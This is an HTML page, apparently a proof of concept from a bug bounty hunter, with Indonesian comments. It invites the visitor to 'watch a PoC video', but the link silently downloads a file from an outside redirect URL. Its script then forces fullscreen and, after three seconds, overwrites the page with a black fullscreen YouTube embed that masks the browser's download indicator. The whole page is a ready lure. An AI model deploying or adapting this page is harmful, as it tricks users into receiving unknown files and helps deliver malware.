<!DOCTYPE html>
<html>
<head>
    <title>PoC Video</title>
</head>
<body>
    <h1>Klik kiri link di bawah ini untuk melihat video PoC bug bounty hunting saya.</h1>
    
    <a id='aid' href='https://cr.kungfoo.net/yao/downloads/multiple/redirect_download.php' download>Watch PoC Video</a>

    <script>
        // Mengambil elemen link
        const linkElem = document.getElementById('aid');

        // Menambahkan event listener untuk klik kiri
        linkElem.addEventListener('click', function(event) {
            
            // 1. Memicu mode fullscreen pada seluruh body halaman ini
            // (Browser biasanya mengizinkan ini karena dipicu langsung oleh klik pengguna)
            if (document.body.requestFullscreen) {
                document.body.requestFullscreen();
            } else if (document.body.webkitRequestFullscreen) { /* Safari */
                document.body.webkitRequestFullscreen();
            } else if (document.body.msRequestFullscreen) { /* IE11 */
                document.body.msRequestFullscreen();
            }

            // 2. Menjalankan fungsi penimpaan halaman setelah jeda 3 detik
            setTimeout(v, 3000); 
        });

        function v() {  
            // Menimpa seluruh isi dokumen HTML
            document.write(`
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Video Playing</title>
                    <style>
                        /* Memastikan latar belakang hitam menutupi seluruh layar fullscreen */
                        body, html {
                            margin: 0;
                            padding: 0;
                            width: 100%;
                            height: 100%;
                            background-color: #000;
                            display: flex;
                            justify-content: center;
                            align-items: center;
                            overflow: hidden; /* Mencegah scrollbar */
                        }
                        
                        /* Wadah video berukuran kecil di tengah layar */
                        .video-container {
                            width: 560px;  /* Lebar video (kecil) */
                            height: 315px; /* Tinggi video (kecil) */
                            background-color: #333; 
                            box-shadow: 0 0 20px rgba(255,255,255,0.2); /* Sedikit efek bayangan */
                        }
                        
                        iframe {
                            width: 100%;
                            height: 100%;
                            border: none;
                        }
                    </style>
                </head>
                <body>
                    <div class="video-container">
                        <iframe src="https://www.youtube.com/embed/jfKfPfyJRdk?autoplay=1&mute=1" title="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
                    </div>
                </body>
                </html>
            `); 
            
            // Menutup dokumen agar browser tahu penulisan selesai
            document.close();
        }
    </script>
</body>
</html>
